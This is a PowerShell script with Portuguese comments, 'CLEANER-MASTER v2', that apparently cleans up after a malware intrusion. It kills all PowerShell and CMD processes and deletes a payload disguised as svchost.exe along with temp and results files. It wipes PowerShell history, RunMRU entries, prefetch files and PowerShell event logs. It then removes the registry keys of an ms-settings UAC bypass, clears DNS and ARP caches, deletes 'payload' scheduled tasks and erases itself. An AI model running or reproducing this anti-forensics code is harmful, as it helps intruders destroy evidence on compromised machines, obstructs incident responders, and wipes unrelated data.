<#
.SYNOPSIS
    CLEANER-MASTER v2 – Encerra TODOS os processos PowerShell/CMD,
    remove arquivos, logs, histórico, chaves de registro e se autodestrói.
#>

# ===== CONFIGURAÇÕES =====
$tempDir      = $env:TEMP
$payloadName  = "svchost.exe"
$resultsDir   = Join-Path $tempDir "results"
$flagFile     = Join-Path $tempDir "END_ALL.txt"

# Guarda o PID do script atual (será morto somente no final)
$myPid = $PID

# ===== 1. ENCERRAR TODOS OS POWERSHELL E CMD (exceto o atual temporariamente) =====
Write-Host "[CLEANER] Encerrando TODAS as instâncias do PowerShell e CMD..."

# Lista de processos a matar (inclui o próprio script, mas protegemos o atual)
$targetProcesses = @("powershell", "cmd")

# Mata todos os processos com esses nomes, exceto o PID do script
foreach ($procName in $targetProcesses) {
    Get-Process -Name $procName -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $myPid } | ForEach-Object {
        Write-Host "[CLEANER] Matando $($_.Name) (PID $($_.Id))"
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
    }
}

# Aguarda um pouco para garantir que os processos foram finalizados
Start-Sleep -Seconds 2

# Se ainda sobrar algum (travado), usa taskkill como força bruta
foreach ($procName in $targetProcesses) {
    $remaining = Get-Process -Name $procName -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $myPid }
    if ($remaining) {
        Write-Host "[CLEANER] Ainda restam processos $procName, usando taskkill /f..."
        & taskkill /f /im "$procName.exe" /t 2>$null
    }
}

# ===== 2. REMOVER ARQUIVOS E PASTAS =====
Write-Host "[CLEANER] Removendo arquivos e pastas..."
$pathsToDelete = @(
    Join-Path $tempDir $payloadName,
    $resultsDir,
    $flagFile,
    "$tempDir\*.zip",
    "$tempDir\*.ps1",
    "$tempDir\*.exe",
    "$tempDir\*.txt",
    "$tempDir\*.csv",
    "$tempDir\*.json",
    "$env:LOCALAPPDATA\Temp\*",
    "$env:WINDIR\Temp\*"
)
foreach ($path in $pathsToDelete) {
    if (Test-Path $path) {
        Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[CLEANER] Removido: $path"
    }
}

# ===== 3. LIMPAR HISTÓRICO DO POWERSHELL =====
$psHistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $psHistoryPath) {
    Clear-Content $psHistoryPath -Force
    Write-Host "[CLEANER] Histórico PSReadLine apagado."
}

# ===== 4. LIMPAR RUNMRU (EXECUTAR) =====
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

# ===== 5. LIMPAR PREFETCH =====
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Get-ChildItem "$env:SystemRoot\Prefetch" -Filter "*.pf" | Where-Object {
        $_.Name -like "*POWERSHELL*" -or $_.Name -like "*CMD*" -or $_.Name -like "*SVCHOST*"
    } | Remove-Item -Force -ErrorAction SilentlyContinue
    Write-Host "[CLEANER] Prefetch limpo."
}

# ===== 6. LIMPAR LOGS DE EVENTOS (se admin) =====
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $logNames = @("Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
    foreach ($log in $logNames) {
        try { wevtutil cl $log 2>$null } catch {}
    }
    Write-Host "[CLEANER] Logs do PowerShell limpos."
}

# ===== 7. REMOVER CHAVES DE REGISTRO DO BYPASS UAC =====
$regPaths = @(
    "HKCU:\Software\Classes\ms-settings",
    "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
)
foreach ($rp in $regPaths) {
    if (Test-Path $rp) {
        Remove-Item $rp -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[CLEANER] Chave de registro removida: $rp"
    }
}

# ===== 8. LIMPAR CACHES DE REDE =====
ipconfig /flushdns | Out-Null
arp -d * | Out-Null

# ===== 9. REMOVER TAREFAS AGENDADAS SUSPEITAS =====
Get-ScheduledTask | Where-Object { $_.TaskPath -like "*TEMP*" -or $_.TaskName -like "*cleaner*" -or $_.TaskName -like "*payload*" } | ForEach-Object {
    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
}

# ===== 10. AUTO-REMOÇÃO DO SCRIPT =====
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    # Tenta remover o arquivo do script atual
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
    Write-Host "[CLEANER] Script auto-removido."
}

# ===== 11. ENCERRAMENTO FINAL – MATA O PRÓPRIO PROCESSO =====
Write-Host "[CLEANER] Limpeza completa. Encerrando este PowerShell..."
[GC]::Collect()
Start-Sleep -Seconds 1
# Mata o processo atual e, de brinde, qualquer outro powershell que tenha escapado
Stop-Process -Id $myPid -Force
# Caso falhe, tenta via taskkill
& taskkill /f /pid $myPid /t 2>$null
